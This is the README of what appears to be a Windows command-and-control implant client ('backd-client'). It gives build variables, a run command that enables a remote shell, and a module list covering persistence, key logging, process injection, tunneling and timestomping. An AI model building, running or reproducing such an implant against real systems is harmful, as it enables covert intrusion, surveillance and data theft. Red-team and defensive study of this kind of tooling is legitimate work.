# Windows client

See `../docs/CLIENT.md` for the full module list and security notes.

## Build

```bat
build.cmd --clean
set C2_CLIENT_DOMAIN=127.0.0.1
set C2_CLIENT_PORT=9909
set C2_CLIENT_PATH=/ws
set C2_CLIENT_ID=client-01
set C2_CLIENT_PSK=base64:REPLACE_ME
set C2_ALLOW_SHELL=1
build.cmd
```

The generated `src/generated_config.h` is ignored by Git. Do not commit it with a real PSK.

## Run

```bat
backd-client.exe --id client-01 --host 127.0.0.1 --port 9909 --path /ws --psk base64:... --allow-shell -v
```

Prefer `C2_CLIENT_PSK` or a compiled-in key over `--psk` so the key does not appear in process listings.

## Layout

- `src/main.c` — connection loop, HELLO, tasks, heartbeats
- `src/ws.c` — minimal WebSocket client
- `src/crypto.c` — AES-GCM/HKDF/HMAC helpers
- `src/tlv.c` — TLV encode/decode
- `src/modules_core.c` — sysinfo, shell, files, processes
- `src/modules_adv.c` — persistence, key logging, tunnel, cleanup
- `src/modules_adv2.c` — injection, migration, screenshot, timestomp
- `src/util.c` — Windows helpers and logging
- `src/config.h` — shared structures
- `build.cmd` / `Makefile` — build and import-table gate
